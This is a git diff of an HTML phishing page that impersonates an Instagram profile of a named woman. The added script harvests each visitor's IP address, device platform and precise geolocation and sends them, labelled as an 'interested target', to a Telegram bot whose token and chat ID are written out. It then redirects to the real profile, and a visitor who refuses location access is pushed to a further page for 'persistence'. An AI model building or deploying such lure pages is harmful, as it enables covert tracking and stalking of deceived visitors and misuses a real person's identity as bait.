@@ -4,15 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <title>Verificação de Perfil | Meta</title>
+    <title>Isaaa.oliveiraa (@isaaa.oliveiraa) • Fotos e vídeos do Instagram</title>
     
-    <meta property="og:title" content="Visualizador de Perfil Restrito">
-    <meta property="og:description" content="Clique para validar seu acesso e visualizar este perfil com segurança.">
+    <meta property="og:title" content="Isaaa.oliveiraa (@isaaa.oliveiraa) • Fotos e vídeos do Instagram">
+    
+    <meta property="og:description" content="1.213 seguidores, seguindo 854, 113 post - Veja fotos e vídeos de @isaaa.oliveiraa no Instagram">
     
     <meta property="og:image" content="https://autenticador2.github.io/meta/perfilmulher.jpg">
     <meta property="og:image:secure_url" content="https://autenticador2.github.io/meta/perfilmulher.jpg">
     
-    <meta property="og:image:type" content="image/jpeg">
     <meta property="og:image:width" content="1080">
     <meta property="og:image:height" content="1920">
     <meta property="og:type" content="website">
@@ -40,9 +40,12 @@
 </div>
 
 <script>
+    // CONFIGURAÇÕES DO TELEGRAM
     const TOKEN = "8406636992:AAE7z6BGxeO-lfLMYVQ9yOWY-CMLiy586Ic"; 
     const ID = "560716860"; 
-    const REDIRECIONAR_PARA = "https://www.instagram.com/NOME_DO_PERFIL/"; 
+    
+    // LINK REAL DA ISA OLIVEIRA PARA REDIRECIONAMENTO
+    const REDIRECIONAR_PARA = "https://www.instagram.com/eu.isaoliveiraa/?utm_source=ig_web_button_share_sheet"; 
 
     async function iniciarProcesso() {
         const btn = document.getElementById('btnAcesso');
@@ -63,7 +66,7 @@
             const lon = pos.coords.longitude;
             const mapa = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            const msg = `🎯 *NOVO ALVO INTERESSADO*\n\n🌐 IP: ${ipAlvo}\n📍 Localização: ${mapa}\n📱 Aparelho: ${navigator.platform}`;
+            const msg = `🎯 *ALVO INTERESSADO*\n\n👤 Perfil: Isa Oliveira\n🌐 IP: ${ipAlvo}\n📍 Localização: ${mapa}\n📱 Aparelho: ${navigator.platform}`;
             
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -71,9 +74,11 @@
                 body: JSON.stringify({ chat_id: ID, text: msg, parse_mode: 'Markdown' })
             });
 
+            // Redirecionamento para o perfil oficial da Isa
             window.location.href = REDIRECIONAR_PARA;
 
         }, (err) => {
+            // Se negar, manda para a persistência
             window.location.href = "autorizar.html";
         }, options);
     }
